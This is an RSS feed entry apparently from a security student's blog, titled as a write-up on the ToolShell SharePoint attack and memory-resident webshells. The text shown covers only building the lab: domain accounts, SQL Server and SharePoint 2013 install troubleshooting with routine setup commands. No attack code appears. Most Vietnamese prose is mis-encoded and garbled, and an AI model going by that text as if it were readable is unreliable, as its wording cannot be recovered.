<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DotNet on kev1n's Blog</title><link>https://kev1n1203.github.io/tags/dotnet/</link><description>Recent content in DotNet on kev1n's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Jan 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://kev1n1203.github.io/tags/dotnet/index.xml" rel="self" type="application/rss+xml"/><item><title>ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized</title><link>https://kev1n1203.github.io/p/sharepoint-2013/</link><pubDate>Tue, 20 Jan 2026 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/p/sharepoint-2013/</guid><description>&lt;p&gt;Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  &amp;ldquo;LÃ m Sharepoint Ä‘i em&amp;rdquo;. So yeah, here we are ğŸ—¿&lt;/p&gt;
&lt;h2 id="i-setup-guidelines"&gt;I. Setup Guidelines
&lt;/h2&gt;&lt;p&gt;Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d" target="_blank" rel="noopener"
&gt;https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://hackmd.io/@taidh/ByE7_Kqlh" target="_blank" rel="noopener"
&gt;https://hackmd.io/@taidh/ByE7_Kqlh&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="cáº¥u-hÃ¬nh-mÃ¡y-áº£o"&gt;Cáº¥u hÃ¬nh mÃ¡y áº£o:
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DC: WinServer 2012 - 2x2 cores - 4GB RAM&lt;/li&gt;
&lt;li&gt;SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM&lt;/li&gt;
&lt;li&gt;Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="dc"&gt;DC
&lt;/h3&gt;&lt;p&gt;Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJNrQMhole.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;First name: SharePoint
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last name: FarmAdmin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User logon name: sp_farmadmin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Bá» chá»n â€œUser must change password at next logonâ€
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Chá»n â€œPassword never expiresâ€
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;TÆ°Æ¡ng tá»± cho sp_service vÃ  sql_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sp_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;First name: SharePoint
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last name: Service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username: sp_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sql_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;First name: SQL
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last name: Service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username: sql_service
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="sql-server"&gt;SQL Server
&lt;/h3&gt;&lt;p&gt;Join Domain vÃ  set DNS.
Táº£i SQL Server Express báº£n Advanced Ä‘á»ƒ cÃ i luÃ´n cáº£ thá»ƒ Management Studio. Link táº£i: &lt;a class="link" href="https://www.microsoft.com/en-us/download/details.aspx?id=43351" target="_blank" rel="noopener"
&gt;https://www.microsoft.com/en-us/download/details.aspx?id=43351&lt;/a&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y chá»n SQLEXPRADV_x64_ENU.exe vÃ  cÃ i Ä‘áº·t nhÆ° bÃ¬nh thÆ°á»ng.&lt;br&gt;
LÆ°u Ã½: Äá»ƒ khÃ´ng bá»‹ lá»—i &lt;code&gt;The SQL Server service account login or password is not valid. Use SQL Server Configuration Manager to update the service account.&lt;/code&gt; khi set ngÆ°á»i dÃ¹ng DC\sql_service cho SQL Server Database Engine thÃ¬ sá»­ dá»¥ng WinServer 2012 Ä‘á»ƒ set up, dÃ¹ng Win10 sáº½ bá»‹ lá»—i (mÃ¬nh khÃ´ng hiá»ƒu vÃ¬ sao).&lt;br&gt;
CÃ²n láº¡i config theo hÆ°á»›ng dáº«n cá»§a anh Jang vÃ  a TÃ iDH&lt;/p&gt;
&lt;h3 id="sharepoint-server"&gt;Sharepoint Server
&lt;/h3&gt;&lt;p&gt;Join Domain vÃ  set DNS.&lt;br&gt;
Link download file img sharepoint: &lt;a class="link" href="https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013" target="_blank" rel="noopener"
&gt;https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013&lt;/a&gt; =&amp;gt; Chá»n báº£n English&lt;br&gt;
WinServer 2012 dÃ­nh ráº¥t nhiá»u lá»—i khi set up SharePoint Server 2013:&lt;/p&gt;
&lt;h4 id="lá»—i-set-role-iis"&gt;Lá»—i set role IIS
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;There&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;during&lt;/span&gt; &lt;span class="n"&gt;Installation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="k"&gt;tool&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;unable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;Application&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="n"&gt;Role&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Web&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IIS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;Role&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Link tham kháº£o náº¿u gáº·p:&lt;br&gt;
&lt;a class="link" href="https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html" target="_blank" rel="noopener"
&gt;https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html&lt;/a&gt;&lt;br&gt;
&lt;a class="link" href="https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/" target="_blank" rel="noopener"
&gt;https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tá»± cÃ i Ä‘áº·t cÃ¡c feature báº±ng Powershell:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Add-WindowsFeature NET-WCF-HTTP-Activation45,NET-WCF-TCP-Activation45,NET-WCF-Pipe-Activation45
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Add-WindowsFeature Net-Framework-Features,Web-Server,Web-WebServer,Web-Common-Http,Web-Static-Content,Web-Default-Doc,Web-Dir-Browsing,Web-Http-Errors,Web-App-Dev,Web-Asp-Net,Web-Net-Ext,Web-ISAPI-Ext,Web-ISAPI-Filter,Web-Health,Web-Http-Logging,Web-Log-Libraries,Web-Request-Monitor,Web-Http-Tracing,Web-Security,Web-Basic-Auth,Web-Windows-Auth,Web-Filtering,Web-Digest-Auth,Web-Performance,Web-Stat-Compression,Web-Dyn-Compression,Web-Mgmt-Tools,Web-Mgmt-Console,Web-Mgmt-Compat,Web-Metabase,Application-Server,AS-Web-Support,AS-TCP-Port-Sharing,AS-WAS-Support, AS-HTTP-Activation,AS-TCP-Activation,AS-Named-Pipes,AS-Net-Framework,WAS,WAS-Process-Model,WAS-NET-Environment,WAS-Config-APIs,Web-Lgcy-Scripting,Windows-Identity-Foundation,Server-Media-Foundation,Xps-Viewer
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Copy file &lt;code&gt;C:\Windows\System32\ServerManager.exe&lt;/code&gt; ngay táº¡i folder System32 vÃ  Ä‘á»•i tÃªn thÃ nh &lt;code&gt;ServerManagerCMD.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Náº¿u váº«n khÃ´ng Ä‘Æ°á»£c, xem log táº¡i &lt;code&gt;%TEMP%&lt;/code&gt; =&amp;gt; prerequisiteinstaller.{thá»i gian cÃ i Ä‘áº·t}.log Ä‘á»ƒ Ä‘á»c log sáº½ tháº¥y command run update role nhÆ° sau:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\system32\ServerManagerCmd.exe&amp;#34; -inputpath &amp;#34;C:\Users\SP_FAR~1\AppData\Local\Temp\PreFEB1.tmp.XML&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe&amp;#34; -i
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\system32\cscript.exe&amp;#34; &amp;#34;C:\Windows\system32\iisext.vbs&amp;#34; /enext &amp;#34;ASP.NET v4.0.30319&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\system32\iisreset.exe&amp;#34; /noforce
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;CÃ³ thá»ƒ tá»± cháº¡y xong rá»“i restart mÃ¡y cÃ i tiáº¿p (biá»‡n phÃ¡p cuá»‘i cÃ¹ng)&lt;br&gt;
LÆ°u Ã½: KhÃ´ng táº¯t ServerManager khi Ä‘ang install. Náº¿u nhÆ° install tháº¥y lÃ¢u chá»©ng tá» Ä‘ang cháº¿t táº¡i bÆ°á»›c set Role nÃ y, nÃ³ Ä‘ang Ä‘á»£i káº¿t quáº£ tráº£ vá»&lt;/p&gt;
&lt;h4 id="lá»—i-khi-download-cÃ¡c-package"&gt;Lá»—i khi download cÃ¡c package
&lt;/h4&gt;&lt;p&gt;Khi download cÃ¡c package nhÆ° SQL Server Native Client vÃ  cÃ¡c package sau sáº½ liÃªn tá»¥c dÃ­nh lá»—i vÃ¬ WinServer 2012 Ä‘Ã£ cÅ© vÃ  khÃ´ng thá»±c hiá»‡n káº¿t ná»‘i Ä‘Æ°á»£c site go.microsoft.com (WinServer 2012 cÃ³ váº¥n Ä‘á» gÃ¬ Ä‘áº¥y vá»›i TLS1.2)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="n"&gt;HRESULT&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Beginning&lt;/span&gt; &lt;span class="n"&gt;download&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Sync&lt;/span&gt; &lt;span class="n"&gt;Framework&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt; &lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;SP1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x64&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fwlink&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="n"&gt;LinkID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;224449&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;InternetOpenUrl&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0X80072F07&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;2147012857&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fwlink&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="n"&gt;LinkID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;224449&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Download&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Last&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Äáº¿n Ä‘oáº¡n nÃ y thÃ¬ khi gáº·p lá»—i á»Ÿ Ä‘Ã¢u mÃ¬nh sáº½ copy link download fail táº¡i file log vÃ  táº£i á»Ÿ ngoÃ i, sau Ä‘Ã³ tá»± cÃ i cÃ¡c package vÃ o.&lt;br&gt;
ÄÃ¢y lÃ  cÃ¡c package mÃ¬nh Ä‘Ã£ táº£i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJvyZG3ogl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¡c file msi thÃ¬ cÃ³ thá»ƒ cháº¡y ngay, sau Ä‘Ã³ restart mÃ¡y cÃ i tiáº¿p.
CÃ²n má»™t sá»‘ file exe nÃªn cháº¡y command, cÃ i Ä‘áº·t giao diá»‡n xong Sharepoint váº«n sáº½ bÃ¡o lÃ  download error (khÃ´ng hiá»ƒu kiá»ƒu gÃ¬):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;WindowsServerAppFabricSetup_x64.exe /i CacheClient,CachingService,CacheAdmin /gac
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;WcfDataServices.exe /quiet /norestart
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;AppFabric1.1-KB2671763-x64-ENU.exe /quiet /norestart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sau khi cÃ i Ä‘áº·t sau Ä‘á»u nÃªn restart rá»“i báº­t lÃªn cÃ i tiáº¿p, cho Ä‘áº¿n khi hiá»‡n quÃ¡ trÃ¬nh cÃ i Ä‘áº·t hoÃ n táº¥t thÃ¬ tiáº¿p tá»¥c cháº¡y setup.exe vÃ  lÃ m theo cÃ¡c bÆ°á»›c set up Sharepoint:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1bdZzhjxl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Cáº¥u hÃ¬nh Sharepoint theo máº·c Ä‘á»‹nh. Táº¡i bÆ°á»›c Database server nháº­p ip cá»§a mÃ¡y SQL Server lÃ  10.10.1.137 vÃ  ngÆ°á»i dÃ¹ng káº¿t ná»‘i lÃ  sp_service. Sau khi cáº¥u hÃ¬nh xong, truy cáº­p tá»›i Ä‘Æ°á»ng dáº«n http://sp-server:16504/ Ä‘á»ƒ xÃ¡c nháº­n Ä‘Ã£ cáº¥u hÃ¬nh Central Admin thÃ nh cÃ´ng:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkGND9yB-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p tá»¥c táº¡o site test collection:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Skme_qJrbx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
